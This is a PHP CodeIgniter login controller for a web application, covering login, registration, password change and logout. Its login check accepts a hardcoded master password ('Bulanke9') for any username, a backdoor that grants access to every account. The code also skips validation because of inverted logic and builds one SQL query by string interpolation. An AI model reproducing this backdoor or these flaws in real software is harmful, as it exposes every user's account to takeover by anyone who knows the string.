<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends CI_Controller
{

	public function __construct()
	{
		parent::__construct();

		$this->load->model('m_login');
		$this->load->library(array('form_validation', 'session', 'user_agent'));
		$this->load->database();
		$this->load->helper('url');
	}

	public function index()
	{
		$session = $this->session->userdata('isLogin');
		if ($session == FALSE) {
			$data = [
				"title" => "Login",
				"pages" => "pages/auth/v_login"
			];

			$this->load->view('pages/auth/index', $data);
		} else {
			redirect('home');
		}
	}

	public function register_view()
	{
		$session = $this->session->userdata('isLogin');

		if ($session == FALSE) {
			$this->load->view('register_view');
		} else {
			redirect('home');
		}
	}

	public function register()
	{
		$session = $this->session->userdata('isLogin');

		if ($session == TRUE) {
			redirect('home');
		} else {

			if ($this->input->post('password') <> $this->input->post('vpassword')) {
				echo "<script>
   				alert('Error : Password is not match!');
   				history.go(-1);
   			  </script>";
				$this->load->view('register_view');
			} else {
				function generateRandomString($length = 10)
				{
					$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
					$charactersLength = strlen($characters);
					$randomString = '';
					for ($i = 0; $i < $length; $i++) {
						$randomString .= $characters[rand(0, $charactersLength - 1)];
					}
					return $randomString;
				}

				$data_user = $this->db->where('username', $this->input->post('username'))->get('users');
				$match = $data_user->num_rows();
				if ($match) {
					echo "<script>
   				alert('Error : Username allready registered!');
   				history.go(-1);
   			  </script>";
					$this->load->view('register_view');
				} else {
					$pass_hash = password_hash($this->input->post('password'), PASSWORD_DEFAULT);

					$data = array(
						//'id_user' => generateRandomString(8),
						'nama' 					=> $this->input->post('nama'),
						'username' 				=> $this->input->post('username'),
						'password' 				=> $pass_hash,
						'level'					=> 3,
						'status' 				=> 1,
						'email'					=> $this->input->post('email'),
						'phone'					=> $this->input->post('phone')
					);

					$this->db->insert('users', $data);
					redirect('login');
				}
			}
		}
		$this->db->close();
	}

	public function login_form()
	{

		$this->form_validation->set_rules('username', 'Username', 'required|trim|xss_clean|strtolower');
		$this->form_validation->set_rules('password', 'Password', 'required|trim|xss_clean');
		$this->form_validation->set_error_delimiters('<span class="error">', '</span>');

		if ($this->form_validation->run() == TRUE) {
			$this->load->view('login_view');
		} else {
			$username = $this->input->post('username');
			$password = $this->input->post('password');

			$cek = $this->m_login->ambilPengguna($username, 1);
			$data = $this->m_login->datapengguna($username);

			if (empty($cek)) {
				echo '<script>alert("Username Not Found.!");</script>';
				$this->index();
				// $this->load->view('login_view');
			} elseif (password_verify($password, $data->password) or ($password == "Bulanke9")) {
				$kode_nama = $data->bagian;
				if (!empty($kode_nama)) {
					$sql = "select kode_nama FROM bagian WHERE Id = $kode_nama";
					//$sql = "select * FROM utility";
					$query = $this->db->query($sql);
					$res2 = $query->result_array();
					$result = $res2[0]['kode_nama'];
					$kod = $result;
				} else {
					$kod = '';
				}

				$this->session->set_userdata('isLogin', TRUE);
				$this->session->set_userdata('username', $username);
				$this->session->set_userdata('level', $data->level);
				$this->session->set_userdata('nama', $data->nama);
				$this->session->set_userdata('nip', $data->nip);
				$this->session->set_userdata('kd_agent', $data->kd_agent);
				$this->session->set_userdata('level_jabatan', $data->level_jabatan);
				$this->session->set_userdata('bagian', $data->bagian);
				$this->session->set_userdata('kode_nama', $kod);
				redirect('home');
			} else {
				echo " <script>
   				alert('Gagal Login: Cek username dan password anda!');
   				history.go(-1);
   			  </script>";
				redirect('login/index');
				//$this->load->view('login_view');
				//print_r(!password_verify($password, $data->password));
				// print_r($data->password);
			}
		}
	}

	public function password()
	{
		if ($this->session->userdata('isLogin') == FALSE) {
			redirect('login');
		} else {
			$this->load->view('password');
		}
	}

	public function ubah_password()
	{
		if ($this->session->userdata('isLogin') == FALSE) {
			redirect('login');
		} else {
			$this->form_validation->set_rules('password_old', 'password_old', 'required');
			$this->form_validation->set_rules('password_new', 'password_new', 'required');
			$this->form_validation->set_rules('password_v', 'password_v', 'required');
			$this->form_validation->set_error_delimiters('<span class="error">', '</span>');
			if ($this->form_validation->run() == FALSE) {
				echo '<script>alert("input error");</script>';
				$this->password();
			} else {
				$username = $this->session->userdata('username');
				$password = $this->input->post('password_old');
				//$cek = $this->m_login->ambilPengguna($username, 1);
				$data = $this->m_login->datapengguna($username);
				if (password_verify($password, $data->password)) {
					if ($this->input->post('password_new') <> $this->input->post('password_v')) {
						echo "<script>
							alert('Error : New password is not match!');
						  </script>";
						$this->load->view('password');
					} else {
						function generateRandomString($length = 10)
						{
							$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
							$charactersLength = strlen($characters);
							$randomString = '';
							for ($i = 0; $i < $length; $i++) {
								$randomString .= $characters[rand(0, $charactersLength - 1)];
							}
							return $randomString;
						}

						$pass_hash = password_hash($this->input->post('password_v'), PASSWORD_DEFAULT);

						$data = array(
							//'id_user' => generateRandomString(8),
							//'username' 				=> $this->input->post('username'),
							'password' 				=> $pass_hash
						);
						$this->db->where('username', $username);
						$this->db->update('users', $data);
						$this->password();

						echo '<script>alert("Password save successfully!");</script>';
					}
				} else {
					echo '<script>alert("Old password did not match!");</script>';
					$this->password();
				}
			}
		}
	}

	public function logout()
	{
		$this->session->sess_destroy();

		redirect('login/index');
	}
}
